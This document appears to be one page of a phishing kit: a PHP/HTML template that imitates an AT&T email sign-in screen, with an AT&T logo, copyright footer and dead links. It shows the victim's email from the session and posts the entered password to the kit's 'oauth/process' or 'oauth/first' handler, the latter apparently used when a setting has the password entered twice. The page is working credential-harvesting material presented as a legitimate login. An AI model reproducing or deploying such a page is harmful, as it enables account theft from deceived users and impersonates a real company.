<?php
defined("ALLOW") or exit('No direct script access allowed');
if (_config('DOUBLEEMAIL') == 'on') {
    $url = base_url() . "oauth/first";
} else {
    $url = base_url() . "oauth/process";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon | Att Account</title>
    <link rel="shortcut icon" href="<?= base_url() ?>Gens/Email/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
</head>
<style>
    body {
        margin:0;
        padding:0;

    }
    .card {
        width: 100%;
        max-width: 450px;
        background-color: white;
        margin: 0 auto;
        overflow: hidden;
        border:1px solid gray;
        height: 80vh;
        border-radius: 20px;
      }
      .input-group label {
        margin-bottom: 5px; 
        display: block; 
        font-weight: bold;
        font-family: Arial, sans-serif ;
     }   

        .input-group input {
        width: 100%;
        padding: 10px;
        border: 1px solid gray;
        border-radius: 10px;
        box-sizing: border-box;
         font-family: Arial, sans-serif;
  }

  .large-checkbox {
      width: 20px;
      height: 20px;
      margin-right: 10px;
  }

  .checkbox-label {
      display: flex;
      align-items: center;
      font-family: Arial, sans-serif;
      font-size: 16px;
      color: #333;
  }

</style>
<body>
    <div class="card mt-5 mb-3">
        <div class="text-center mt-5">
            <img src="<?= base_url() ?>Gens/Email/attmail.svg" alt="" width="100">
        </div>
        <div class="text-center mt-4">
            <h2 style="font-weight: bold;">Welcome</h2>
        </div>
        <div class="text-center">
            <span><i class="fa fa-circle-arrow-left fa-1x"> </i> <?php echo $_SESSION['email'];?> </span>
        </div>
        <form action="<?= $url ?>" method="post">
            <div style="margin-top: -25px;" class="form-group m-3">
                <label style="height: 25px; font-weight: bold; color: gray;" class="form-label mb-2" for="">Password</label>
                <input style="border: 1px solid black; border-radius:10px; padding: 10px;" type="password" class="form-control mb-4" name="password" id="password" required>
                <div style="text-align: left; margin-top: 20px;" class="checkbox-container mb-5">
                    <label class="checkbox-label" for="">
                        <input class="large-checkbox" type="checkbox" name="" id="">                      
                        Keep me signed in
                    </label>
                </div>
                <button style="font-weight: bold; border-radius:50px; padding: 12px; background-color:#0057b8;" type="submit" class="btn btn-primary d-block w-100 mb-4">Sign in</button>
                <div class="text-left mt-3">
                    <a style="font-weight: bold; text-decoration:none; color:#0057b8; font-size:15px" href="#">Forgot password?</a>
                </div>
            </div>
        </form>
    </div>
        <div style="margin-top: 50px;" class="footer text-center">
        <span style="font-size: 13px; color:gray">Legal policy center</span>
        <span style="font-size: 13px; color:gray" class="ms-4">Privacy policy</span>
        <span style="font-size: 13px; color:gray" class="ms-4">Terms of use</span>
        <span style="font-size: 13px; color:gray" class="ms-4">Your privacy choices</span>
        <div class="">
            <span style="font-size: 13px; color:gray">©2025 AT&T Intellectual Property. All rights reserved.</span>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/js/all.min.js"></script>
</body>
</html>